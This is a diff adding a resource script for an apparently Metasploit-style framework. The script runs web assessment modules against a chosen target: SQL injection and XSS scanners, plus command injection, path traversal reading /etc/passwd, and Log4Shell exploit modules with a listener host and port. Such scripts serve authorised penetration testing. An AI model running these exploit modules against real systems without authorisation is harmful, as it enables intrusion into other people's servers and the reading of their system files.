@@ -1,0 +1,47 @@
+# RCF Web Application Assessment
+# Scans and tests a web application for common vulnerabilities
+#
+# Usage: rcf -r scripts/web_assessment.rc
+# Set target before running:
+#   rcf -r scripts/web_assessment.rc --rhosts <target> --lhost <your_ip>
+#
+# Or from console:
+#   setg RHOSTS target.com
+#   setg LHOST 10.0.0.1
+#   resource scripts/web_assessment.rc
+
+# ── Configuration ─────────────────────────────────────────────────────
+# These can be overridden with setg before running
+setg RPORT 80
+setg TARGET_URI /
+setg SSL false
+
+# ── SQL Injection Testing ────────────────────────────────────────────
+use auxiliary/scanner/http/sqli
+set PARAM id
+run
+
+# ── XSS Testing ──────────────────────────────────────────────────────
+use auxiliary/scanner/http/xss
+set PARAM q
+run
+
+# ── Command Injection Testing ────────────────────────────────────────
+use exploit/multi/http/cmd_injection
+set PARAM cmd
+set METHOD GET
+run
+
+# ── Path Traversal Testing ───────────────────────────────────────────
+use exploit/multi/http/path_traversal
+set FILE /etc/passwd
+run
+
+# ── Log4Shell Testing ───────────────────────────────────────────────
+# Requires LHOST to be set
+use exploit/multi/http/log4shell
+set LPORT 1389
+run
+
+# ── Done ─────────────────────────────────────────────────────────────
+show modules
